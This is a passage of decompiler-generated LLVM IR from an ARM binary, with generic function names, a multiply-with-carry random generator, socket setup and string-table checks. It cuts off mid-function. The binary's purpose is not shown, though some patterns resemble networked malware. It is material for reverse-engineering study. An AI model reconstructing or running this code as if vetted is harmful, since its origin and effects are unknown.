  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @function_80d0(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_80d0 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_80d0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_80d0 = load i32, i32* @r4, align 4
  %v2_80d0 = trunc i32 %v1_80d0 to i8
  store i8 %v2_80d0, i8* %arg1, align 1
  %v0_80d4.pr = load i1, i1* @cpsr_n, align 1
  br i1 %v0_80d4.pr, label %bb1, label %.thread

bb1:                                              ; preds = %bb
  %v1_80d4 = load i32, i32* @r4, align 4
  %v2_80d4 = trunc i32 %v1_80d4 to i8
  store i8 %v2_80d4, i8* %arg1, align 1
  br label %.thread

.thread:                                          ; preds = %entry, %bb, %bb1
  ret i32 %tmp

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %.thread, { 2, 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @function_16eac(i32 ptrtoint (i32* @global_var_11984.3 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 122468, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @function_15acc()
  ret i32 %v0_81dc
}

define i32 @function_81ec(i32 %arg1, i16 %arg2) local_unnamed_addr {
dec_label_pc_81ec:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_81f0 = load i32, i32* @fp, align 4
  store i32 33272, i32* %stack_var_-4, align 4
  %v2_81f4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81f4, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_8214 = call i32 @function_14858(i32 %arg1)
  %v2_8224 = icmp eq i32 %v1_8214, 0
  br i1 %v2_8224, label %dec_label_pc_822c, label %dec_label_pc_8238

dec_label_pc_822c:                                ; preds = %dec_label_pc_81ec
  br label %dec_label_pc_8304

dec_label_pc_8238:                                ; preds = %dec_label_pc_81ec
  %tmp = sext i16 %arg2 to i32
  %v1_823c = add i32 %v1_8214, 16
  %v2_823c = inttoptr i32 %v1_823c to i32*
  %v3_823c = load i32, i32* %v2_823c, align 4
  %v1_8240 = inttoptr i32 %v3_823c to i32*
  %v2_8240 = load i32, i32* %v1_8240, align 4
  %v1_8248 = add i32 %v1_8214, 12
  %v2_8248 = inttoptr i32 %v1_8248 to i32*
  %v3_8248 = load i32, i32* %v2_8248, align 4
  store i32 %v3_8248, i32* @r2, align 4
  %v2_8254 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8254, i32* @r3, align 4
  %v5_8260 = call i32 @function_13fd0(i32 %v2_8240, i32 %v2_8254, i32 %v3_8248, i32 %v2_8254, i32 %v1_8214)
  %v2_826c = call i32 @function_1464c(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_828c = call i32 @function_14a84(i32 2, i32 1, i32 6)
  %v2_8298 = ptrtoint i32* %stack_var_-44 to i32
  %v5_82b4 = call i32 @function_14a40(i32 %v3_828c, i32 6, i32 1, i32 %v2_8298, i32 4)
  %v3_82bc = icmp eq i32 %v3_828c, -1
  br i1 %v3_82bc, label %dec_label_pc_82c4, label %dec_label_pc_82d0

dec_label_pc_82c4:                                ; preds = %dec_label_pc_8238
  br label %dec_label_pc_8304

dec_label_pc_82d0:                                ; preds = %dec_label_pc_8238
  %v2_8250 = ptrtoint i32* %stack_var_-40 to i32
  %v3_82e0 = call i32 @function_148dc(i32 %v3_828c, i32 %v2_8250, i32 16)
  %v3_82e8 = icmp eq i32 %v3_82e0, -1
  br i1 %v3_82e8, label %dec_label_pc_82f0, label %dec_label_pc_82fc

dec_label_pc_82f0:                                ; preds = %dec_label_pc_82d0
  br label %dec_label_pc_8304

dec_label_pc_82fc:                                ; preds = %dec_label_pc_82d0
  br label %dec_label_pc_8304

dec_label_pc_8304:                                ; preds = %dec_label_pc_82f0, %dec_label_pc_82c4, %dec_label_pc_822c, %dec_label_pc_82fc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_822c ], [ 0, %dec_label_pc_82c4 ], [ 0, %dec_label_pc_82f0 ], [ %v3_828c, %dec_label_pc_82fc ]
  store i32 %v3_81f0, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_8304, { 3, 0, 1, 2 }
}

define i32 @function_8318(i32 %arg1) local_unnamed_addr {
dec_label_pc_8318:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_8328 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8328, i32* @global_var_2c8ac.6, align 4
  %v1_8348 = add i32 %v0_8328, -1640531527
  store i32 %v1_8348, i32* @global_var_2c8b0.7, align 4
  %v1_8364 = add i32 %v0_8328, 1013904242
  store i32 %v1_8364, i32* @global_var_2c8b4.8, align 4
  br label %dec_label_pc_837c

dec_label_pc_837c:                                ; preds = %dec_label_pc_8318, %dec_label_pc_837c
  %storemerge12 = phi i32 [ 3, %dec_label_pc_8318 ], [ %v1_83c0, %dec_label_pc_837c ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_838c = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2c8ac.6 to i32), i32 -12)
  %v6_838c = inttoptr i32 %v5_838c to i32*
  %v7_838c = load i32, i32* %v6_838c, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_839c = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_2c8ac.6 to i32), i32 -8)
  %v6_839c = inttoptr i32 %v5_839c to i32*
  %v7_839c = load i32, i32* %v6_839c, align 4
  %v2_83a0 = xor i32 %storemerge12, -1640531527
  %v2_83a8 = xor i32 %v2_83a0, %v7_838c
  %v2_83b0 = xor i32 %v2_83a8, %v7_839c
  %v5_83b8 = mul nuw nsw i32 %storemerge12, 4
  %v6_83b8 = add i32 %v5_83b8, ptrtoint (i32* @global_var_2c8ac.6 to i32)
  %v7_83b8 = inttoptr i32 %v6_83b8 to i32*
  store i32 %v2_83b0, i32* %v7_83b8, align 4
  %v1_83c0 = add nuw nsw i32 %storemerge12, 1
  %v7_83d8 = icmp slt i32 %v1_83c0, 4096
  br i1 %v7_83d8, label %dec_label_pc_837c, label %dec_label_pc_83dc

dec_label_pc_83dc:                                ; preds = %dec_label_pc_837c
  %v1_83e4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_83e4

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_837c, { 1, 0 }
}

define i32 @function_83f0() local_unnamed_addr {
dec_label_pc_83f0:
  %v2_8420 = load i32, i32* inttoptr (i32 181776 to i32*), align 16
  %v1_8424 = add i32 %v2_8420, 1
  %v3_842c = urem i32 %v1_8424, 4096
  store i32 %v3_842c, i32* inttoptr (i32 181776 to i32*), align 16
  %v4_8444 = mul nuw nsw i32 %v3_842c, 4
  %v5_8444 = add i32 %v4_8444, ptrtoint (i32* @global_var_2c8ac.6 to i32)
  %v6_8444 = inttoptr i32 %v5_8444 to i32*
  %v7_8444 = load i32, i32* %v6_8444, align 4
  %v6_8464 = udiv i32 %v7_8444, 228675
  store i32 %v6_8464, i32* inttoptr (i32 181772 to i32*), align 4
  br i1 true, label %dec_label_pc_84f4, label %dec_label_pc_84d4

dec_label_pc_84d4:                                ; preds = %dec_label_pc_83f0
  br label %dec_label_pc_84f4

dec_label_pc_84f4:                                ; preds = %dec_label_pc_83f0, %dec_label_pc_84d4
  %v2_84f8 = load i32, i32* inttoptr (i32 181776 to i32*), align 16
  %v4_8514 = mul i32 %v2_84f8, 4
  %v5_8514 = add i32 %v4_8514, ptrtoint (i32* @global_var_2c8ac.6 to i32)
  %v6_8514 = inttoptr i32 %v5_8514 to i32*
  %v7_8514 = load i32, i32* %v6_8514, align 4
  ret i32 %v7_8514

; uselistorder directives
  uselistorder i32* @global_var_2c8ac.6, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2c8ac.6 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_84f4, { 1, 0 }
}

define i32 @function_8528(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8528:
  %v0_8528 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8528, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_8528
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_8528, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_8534(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8534:
  br label %dec_label_pc_8564

dec_label_pc_8564:                                ; preds = %dec_label_pc_8564, %dec_label_pc_8534
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_8534 ], [ %v1_8568, %dec_label_pc_8564 ]
  %v1_8568 = add i32 %stack_var_-24.0, 1
  %v3_8574 = mul i32 %v1_8568, 4
  %v2_8580 = add i32 %v3_8574, %arg2
  %v1_8584 = inttoptr i32 %v2_8580 to i32*
  %v2_8584 = load i32, i32* %v1_8584, align 4
  %v2_8588 = icmp eq i32 %v2_8584, 0
  br i1 %v2_8588, label %dec_label_pc_85e4.preheader, label %dec_label_pc_8564

dec_label_pc_85e4.preheader:                      ; preds = %dec_label_pc_8564
  %v3_85bc = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_85e4

dec_label_pc_859c:                                ; preds = %dec_label_pc_85e4
  %v3_85a0 = mul i32 %storemerge2, 4
  %v2_85ac = add i32 %v3_85a0, %arg2
  %v1_85b0 = inttoptr i32 %v2_85ac to i32*
  %v2_85b0 = load i32, i32* %v1_85b0, align 4
  %v4_85bc = call i32 @function_14528(i8* %v3_85bc, i32 %v2_85b0, i32 %v3_85a0)
  %v2_85c4 = icmp eq i32 %v4_85bc, 0
  %v1_85dc = add nuw i32 %storemerge2, 1
  br i1 %v2_85c4, label %dec_label_pc_85e4, label %dec_label_pc_85fc

dec_label_pc_85e4:                                ; preds = %dec_label_pc_859c, %dec_label_pc_85e4.preheader
  %storemerge2 = phi i32 [ %v1_85dc, %dec_label_pc_859c ], [ 0, %dec_label_pc_85e4.preheader ]
  %v5_85f0 = icmp slt i32 %storemerge2, %v1_8568
  br i1 %v5_85f0, label %dec_label_pc_859c, label %dec_label_pc_85fc

dec_label_pc_85fc:                                ; preds = %dec_label_pc_85e4, %dec_label_pc_859c
  %storemerge = phi i32 [ 1, %dec_label_pc_859c ], [ 0, %dec_label_pc_85e4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_8568, { 1, 0, 2 }
}

define i32 @function_8610(i32 %arg1) local_unnamed_addr {
dec_label_pc_8610:
  %v3_8614 = load i32, i32* @fp, align 4
  %v2_862c = call i32 @function_8534(i32 %arg1, i32 180552)
  store i32 %v3_8614, i32* @fp, align 4
  ret i32 %v2_862c
}

define i32 @function_8648(i32 %arg1) local_unnamed_addr {
dec_label_pc_8648:
  %v3_864c = load i32, i32* @fp, align 4
  %v2_8664 = call i32 @function_8534(i32 %arg1, i32 180520)
  store i32 %v3_864c, i32* @fp, align 4
  ret i32 %v2_8664
}

define i32 @function_867c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_867c:
  %stack_var_-4 = alloca i32, align 4
  %v0_867c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_867c, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_867c
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_867c, %bb
  store i32 34444, i32* %stack_var_-4, align 4
  %v2_8688 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8688, i32* @fp, align 4
  %v1_8698 = call i32 @function_8610(i32 %arg1)
  %v2_86a0 = icmp eq i32 %v1_8698, 0
  br i1 %v2_86a0, label %dec_label_pc_86a8, label %dec_label_pc_86d0

dec_label_pc_86a8:                                ; preds = %bb8
  %v1_86ac = call i32 @function_8648(i32 %arg1)
  %v2_86b4 = icmp ne i32 %v1_86ac, 0
  %. = zext i1 %v2_86b4 to i32
  br label %dec_label_pc_86d0

dec_label_pc_86d0:                                ; preds = %dec_label_pc_86a8, %bb8
  %storemerge1 = phi i32 [ 1, %bb8 ], [ %., %dec_label_pc_86a8 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_86e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8728.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_86e8 = load i32, i32* @fp, align 4
  store i32 %v3_86e8, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_8714 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_8728

dec_label_pc_8728:                                ; preds = %dec_label_pc_8728.lr.ph, %dec_label_pc_8728
  %storemerge25 = phi i32 [ 0, %dec_label_pc_8728.lr.ph ], [ %v1_873c, %dec_label_pc_8728 ]
  %v5_8734 = mul nuw nsw i32 %storemerge25, 4
  %v6_8734 = add i32 %v5_8734, %v2_8714
  %v7_8734 = inttoptr i32 %v6_8734 to i32*
  store i32 0, i32* %v7_8734, align 4
  %v1_873c = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_873c, 32
  br i1 %tmp21, label %dec_label_pc_8728, label %dec_label_pc_8750

dec_label_pc_8750:                                ; preds = %dec_label_pc_8728
  %v13_86e8 = ptrtoint i32* %stack_var_-16 to i32
  %v3_8754 = udiv i32 %arg1, 32
  %v3_8760 = mul nuw nsw i32 %v3_8754, 4
  %v2_8768 = add nsw i32 %v3_8760, -136
  %v2_876c = add i32 %v2_8768, %v13_86e8
  %v1_8770 = inttoptr i32 %v2_876c to i32*
  %v2_8770 = load i32, i32* %v1_8770, align 4
  %v1_8778 = urem i32 %arg1, 32
  %v6_8780 = shl i32 1, %v1_8778
  %v2_8784 = or i32 %v2_8770, %v6_8780
  store i32 %v2_8784, i32* %v1_8770, align 4
  %v1_87a4 = add i32 %arg1, 1
  %v2_87ac = ptrtoint i32* %stack_var_-160 to i32
  %v5_87c0 = call i32 @function_12764(i32 %v1_87a4, i32 %v2_8714, i32 0, i32 0, i32 %v2_87ac)
  %v5_87cc = icmp sgt i32 %v5_87c0, 0
  br i1 %v5_87cc, label %dec_label_pc_87dc, label %dec_label_pc_87d0

dec_label_pc_87d0:                                ; preds = %dec_label_pc_8750
  br label %dec_label_pc_87fc

dec_label_pc_87dc:                                ; preds = %dec_label_pc_8750
  %v4_87f0 = call i32 @function_14990(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87d0, %dec_label_pc_87dc
  %storemerge = phi i32 [ %v4_87f0, %dec_label_pc_87dc ], [ 0, %dec_label_pc_87d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_8714, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_8728, { 1, 0 }
}

define i32 @function_8810(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8810:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_8814 = load i32, i32* @fp, align 4
  store i32 34844, i32* %stack_var_-4, align 4
  %v2_8818 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8818, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_8840 = call i32 @function_13ed0(i8* %arg3, i32 0)
  %v5_8854 = call i32 @function_86e4(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_8864 = load i8, i8* %arg3, align 1
  %v2_8868 = icmp eq i8 %v2_8864, -1
  br i1 %v2_8868, label %dec_label_pc_8870, label %dec_label_pc_8880

dec_label_pc_8870:                                ; preds = %dec_label_pc_8810
  %v3_8864 = zext i8 %v2_8864 to i32
  %v6_887c = call i32 @function_a7a8(i32 %arg1, i32 %tmp, i32 3, i32 %v3_8864, i32 %v5_8854)
  br label %dec_label_pc_8880

dec_label_pc_8880:                                ; preds = %dec_label_pc_8810, %dec_label_pc_8870
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v3_8888 = call i32 @function_8534(i32 %tmp, i32 %v3_8884)
  %v2_8890 = icmp ne i32 %v3_8888, 0
  %. = zext i1 %v2_8890 to i32
  store i32 %v3_8814, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_8864, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8534, { 2, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8880, { 1, 0 }
}

define i32 @function_88c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_88c0:
  %stack_var_-4 = alloca i32, align 4
  %v3_88c4 = load i32, i32* @fp, align 4
  store i32 35020, i32* %stack_var_-4, align 4
  %v2_88c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88c8, i32* @fp, align 4
  %v1_88d8 = add i32 %arg1, 4
  %v2_88d8 = inttoptr i32 %v1_88d8 to i32*
  %v3_88d8 = load i32, i32* %v2_88d8, align 4
  store i32 %v3_88d8, i32* @r0, align 4
  %v1_88e4 = call i32 @function_14814(i32 %v3_88d8)
  store i32 %v3_88c4, i32* @fp, align 4
  ret i32 %v1_88e4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_88fc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_88fc:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8918 = icmp eq i32 %arg2, 0
  br i1 %v2_8918, label %dec_label_pc_8920, label %dec_label_pc_8930

dec_label_pc_8920:                                ; preds = %dec_label_pc_88fc
  %v2_8924 = load i32, i32* %arg1, align 4
  %v1_892c = call i32 @function_12a98(i32 %v2_8924)
  br label %dec_label_pc_8930

dec_label_pc_8930:                                ; preds = %dec_label_pc_88fc, %dec_label_pc_8920
  %v2_8938 = add i32 %tmp, 16
  %v3_8938 = inttoptr i32 %v2_8938 to i32*
  store i32 0, i32* %v3_8938, align 4
  %v3_893c = load i32, i32* %stack_var_-24, align 4
  %v1_8948 = trunc i32 %v3_893c to i8
  %v3_8948 = add i32 %tmp, 8
  %v4_8948 = inttoptr i32 %v3_8948 to i8*
  store i8 %v1_8948, i8* %v4_8948, align 1
  %v1_8950 = add i32 %tmp, 24
  %v2_8950 = inttoptr i32 %v1_8950 to i32*
  %v3_8950 = load i32, i32* %v2_8950, align 4
  store i32 1024, i32* @r2, align 4
  %v2_8960 = inttoptr i32 %v3_8950 to i8*
  %v3_8960 = call i32 @function_13ed0(i8* %v2_8960, i32 0)
  ret i32 %v3_8960

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8930, { 1, 0 }
}

define i32 @function_8970(i32 %arg1) local_unnamed_addr {
dec_label_pc_8970:
  %v2_898c = inttoptr i32 %arg1 to i32*
  %v3_898c = call i32 @function_88fc(i32* %v2_898c, i32 0)
  %v3_8998 = add i32 %arg1, 9
  %v4_8998 = inttoptr i32 %v3_8998 to i8*
  store i8 1, i8* %v4_8998, align 1
  ret i32 %v3_898c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_89a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_89a8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_89c8 = call i32 @function_13f70()
  store i32 %v0_89c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_89e8

dec_label_pc_89e8:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_89a8
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_89a8 ], [ %v1_89e0, %dec_label_pc_89e8 ]
  %v2_89f4 = add i32 %stack_var_-24.0, %arg1
  %v1_89f8 = inttoptr i32 %v2_89f4 to i8*
  %v2_89f8 = load i8, i8* %v1_89f8, align 1
  %v3_89f8 = zext i8 %v2_89f8 to i32
  store i32 %v3_89f8, i32* %r0.global-to-local, align 4
  %v1_8a00 = call i32 @function_12acc(i32 %v3_89f8)
  store i32 %v1_8a00, i32* %r0.global-to-local, align 4
  %v2_8a08 = icmp eq i32 %v1_8a00, 0
  %v1_89e0 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8a08, label %dec_label_pc_8a20.preheader, label %dec_label_pc_89e8

dec_label_pc_8a20.preheader:                      ; preds = %dec_label_pc_89e8
  %v1_89d0 = add i32 %v0_89c8, -1
  %v5_8a2c10 = icmp slt i32 %v1_89d0, %stack_var_-24.0
  br i1 %v5_8a2c10, label %dec_label_pc_8aa0.preheader, label %dec_label_pc_8a30

dec_label_pc_8a14:                                ; preds = %dec_label_pc_8a30
  %v1_8a18 = add i32 %stack_var_-20.011, -1
  %v5_8a2c = icmp slt i32 %v1_8a18, %stack_var_-24.0
  br i1 %v5_8a2c, label %dec_label_pc_8aa0.preheader, label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_8a20.preheader, %dec_label_pc_8a14
  %stack_var_-20.011 = phi i32 [ %v1_8a18, %dec_label_pc_8a14 ], [ %v1_89d0, %dec_label_pc_8a20.preheader ]
  %v2_8a3c = add i32 %stack_var_-20.011, %arg1
  %v1_8a40 = inttoptr i32 %v2_8a3c to i8*
  %v2_8a40 = load i8, i8* %v1_8a40, align 1
  %v3_8a40 = zext i8 %v2_8a40 to i32
  store i32 %v3_8a40, i32* %r0.global-to-local, align 4
  %v1_8a48 = call i32 @function_12acc(i32 %v3_8a40)
  store i32 %v1_8a48, i32* %r0.global-to-local, align 4
  %v2_8a50 = icmp eq i32 %v1_8a48, 0
  br i1 %v2_8a50, label %dec_label_pc_8aa0.preheader, label %dec_label_pc_8a14

dec_label_pc_8aa0.preheader:                      ; preds = %dec_label_pc_8a14, %dec_label_pc_8a30, %dec_label_pc_8a20.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_89d0, %dec_label_pc_8a20.preheader ], [ %v1_8a18, %dec_label_pc_8a14 ], [ %stack_var_-20.011, %dec_label_pc_8a30 ]
  br label %dec_label_pc_8aa0

dec_label_pc_8a64:                                ; preds = %dec_label_pc_8aa0
  %v2_8a88 = add i32 %storemerge1, %arg1
  %v1_8a8c = inttoptr i32 %v2_8a88 to i8*
  %v2_8a8c = load i8, i8* %v1_8a8c, align 1
  %v3_8a90 = inttoptr i32 %v2_8ac4 to i8*
  store i8 %v2_8a8c, i8* %v3_8a90, align 1
  %v1_8a98 = add i32 %storemerge1, 1
  br label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8aa0.preheader, %dec_label_pc_8a64
  %storemerge1 = phi i32 [ %v1_8a98, %dec_label_pc_8a64 ], [ %stack_var_-24.0, %dec_label_pc_8aa0.preheader ]
  %v7_8aac = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_8ab8 = sub i32 %storemerge1, %stack_var_-24.0
  %v2_8ac4 = add i32 %v2_8ab8, %arg1
  br i1 %v7_8aac, label %dec_label_pc_8ab0, label %dec_label_pc_8a64

dec_label_pc_8ab0:                                ; preds = %dec_label_pc_8aa0
  %v3_8acc = inttoptr i32 %v2_8ac4 to i8*
  store i8 0, i8* %v3_8acc, align 1
  %v1_8ad8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8ad8

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_89d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 1, 5, 6, 0 }
  uselistorder i32 (i32)* @function_12acc, { 1, 0 }
  uselistorder label %dec_label_pc_8aa0, { 1, 0 }
  uselistorder label %dec_label_pc_8aa0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
}

define i32 @function_8adc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8adc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_8aec = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8af8 = icmp eq i32 %v0_8aec, 0
  br i1 %v2_8af8, label %dec_label_pc_8b2c, label %dec_label_pc_8b00

dec_label_pc_8b00:                                ; preds = %dec_label_pc_8adc
  %v1_8b04 = inttoptr i32 %v0_8aec to i32*
  %v2_8b04 = load i32, i32* %v1_8b04, align 4
  %v1_8b10 = trunc i32 %arg2 to i8
  %v3_8b10 = inttoptr i32 %v2_8b04 to i8*
  store i8 %v1_8b10, i8* %v3_8b10, align 1
  %v2_8b18 = load i32, i32* %v1_8b04, align 4
  %v1_8b1c = add i32 %v2_8b18, 1
  store i32 %v1_8b1c, i32* %v1_8b04, align 4
  %v1_8b48.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b40

dec_label_pc_8b2c:                                ; preds = %dec_label_pc_8adc
  %v2_8ae8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_8b3c = call i32 @function_12978(i32 1, i32 %v2_8ae8)
  store i32 %v2_8b3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b40

dec_label_pc_8b40:                                ; preds = %dec_label_pc_8b00, %dec_label_pc_8b2c
  %v1_8b48 = phi i32 [ %v1_8b48.pre, %dec_label_pc_8b00 ], [ %v2_8b3c, %dec_label_pc_8b2c ]
  ret i32 %v1_8b48

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_8b40, { 1, 0 }
}

define i32 @function_8b4c(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8b4c:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_8b50 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8c08, label %dec_label_pc_8b88

dec_label_pc_8b88:                                ; preds = %dec_label_pc_8b4c
  %v2_8bb819 = load i8, i8* %arg2, align 1
  %v2_8bbc21 = icmp eq i8 %v2_8bb819, 0
  br i1 %v2_8bbc21, label %dec_label_pc_8bc4, label %dec_label_pc_8b9c

dec_label_pc_8b9c:                                ; preds = %dec_label_pc_8b88, %dec_label_pc_8b9c
  %v4_8bb423 = phi i32 [ %v1_8bac, %dec_label_pc_8b9c ], [ %tmp, %dec_label_pc_8b88 ]
  %stack_var_-40.022 = phi i32 [ %v1_8ba0, %dec_label_pc_8b9c ], [ 0, %dec_label_pc_8b88 ]
  %v1_8ba0 = add i32 %stack_var_-40.022, 1
  %v1_8bac = add i32 %v4_8bb423, 1
  %v5_8bb0 = inttoptr i32 %v1_8bac to i8*
  %v2_8bb8 = load i8, i8* %v5_8bb0, align 1
  %v2_8bbc = icmp eq i8 %v2_8bb8, 0
  br i1 %v2_8bbc, label %dec_label_pc_8bc4, label %dec_label_pc_8b9c

dec_label_pc_8bc4:                                ; preds = %dec_label_pc_8b9c, %dec_label_pc_8b88
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_8b88 ], [ %v1_8ba0, %dec_label_pc_8b9c ]
  %v5_8bd0 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8bd0, label %dec_label_pc_8be0, label %dec_label_pc_8bf0

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8bc4
  %v2_8be8 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8bf0

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8bc4, %dec_label_pc_8be0
